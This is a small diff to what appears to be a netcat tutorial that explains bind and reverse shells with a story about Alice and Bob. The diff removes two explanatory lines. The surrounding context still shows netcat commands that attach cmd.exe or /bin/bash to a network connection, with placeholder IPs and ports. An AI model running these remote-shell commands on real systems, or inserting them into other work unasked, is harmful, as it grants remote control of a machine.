@@ -36,8 +36,6 @@ Bob needs Alice's help. Bob set up a listener on port 4444 with -e parameter:
 
 (BOB): nc -nlvp <[PORT]> -e cmd.exe
 
-Alice connects to Bob's pc:
-
 (ALICE): nc -nv <[BOB_IP]> <[PORT]>
 
 <b>Reverse Shell:</b>
@@ -45,8 +43,6 @@ Alice connects to Bob's pc:
 Alice needs Bob's help. Since Alice is beyond firewall it is impossible to BOB to reach Alice. So Alice create a reverse shell:
 
 (ALICE): nc -nv <[BOB_IP]> <[PORT]> -e /bin/bash
-
-Bob connects to Alice's pc:
 
 (BOB): nc -nlvp <[PORT]>
 
